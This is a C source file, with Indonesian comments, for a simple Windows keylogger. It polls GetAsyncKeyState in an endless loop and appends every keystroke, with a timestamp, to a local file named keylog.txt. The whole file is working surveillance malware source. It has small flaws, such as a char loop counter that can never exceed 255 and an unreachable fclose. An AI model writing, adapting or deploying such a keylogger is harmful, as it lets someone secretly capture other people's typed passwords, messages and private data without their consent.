/*Mencetak keyboard yang ditekan dan menyimpannya dalam file txt*/
//Keylogger sederhana

#include <stdio.h>
#include <windows.h>
#include <time.h>

#define KEY_PRESS_STATE -32767

int main() {
    FILE *file;
    char pressedKey;

    // membuka log file dalam append mode
    file = fopen("keylog.txt", "a");
    if (file == NULL) {
        return 1; // Exit jika file tidak bisa dibuka
    }

    fprintf(file, "\n--- Keylogger Di mulai [%u] ---\n", (unsigned)time(NULL));
    fflush(file);

    while (1) {
        for (pressedKey = 8; pressedKey <= 255; pressedKey++) {
            if (GetAsyncKeyState(pressedKey) == KEY_PRESS_STATE) {
                time_t rawtime;
                time(&rawtime);
                
                fprintf(file, "[%u] ", (unsigned)rawtime);
                
                switch ((int)pressedKey) {
                    case ' ':
                        fprintf(file, "SPACE\n");
                        break;
                    case 9:
                        fprintf(file, "TAB\n");
                        break;
                    case 13:
                        fprintf(file, "ENTER\n");
                        break;
                    case 27:
                        fprintf(file, "ESC\n");
                        break;
                    case 8:
                        fprintf(file, "BACKSPACE\n");
                        break;
                    default:
                        // menampilkan standard karakter ASCII yang bisa ditampilkan
                        if (pressedKey >= 32 && pressedKey <= 126) {
                            fprintf(file, "%c\n", pressedKey);
                        } else {
                            fprintf(file, "CODE_%d\n", pressedKey);
                        }
                        break;
                }
                fflush(file); // memastikan log terupdate seketika
            }
        }
        
        // mencegah penggunaan tinggi pada CPU dengan sleeping untuk 10ms
        Sleep(10);
    }

    fclose(file);
    return 0;
}